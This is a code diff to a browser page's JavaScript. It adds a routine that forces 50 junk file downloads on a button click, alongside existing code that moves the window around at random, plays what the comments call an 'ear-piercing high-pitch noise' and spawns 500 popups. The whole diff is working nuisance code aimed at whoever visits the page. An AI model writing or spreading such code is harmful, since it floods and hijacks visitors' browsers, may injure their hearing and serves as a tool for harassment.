@@ -202,9 +202,32 @@
             window.moveTo(randomX, randomY);
         }
 
+        function downloadFile(filename, content) {
+            const blob = new Blob([content], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+        }
+
+        function downloadManyFiles() {
+            for (let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    downloadFile(`file_${i}.txt`, `This is file ${i}`);
+                }, i * 5);
+            }
+        }
+
         button.addEventListener('click', () => {
             // Play ear-piercing high-pitch noise
             playHighPitchNoise();
+            
+            // Download many small files
+            downloadManyFiles();
             
             // Create massive amounts of popups
             for (let i = 0; i < 500; i++) {
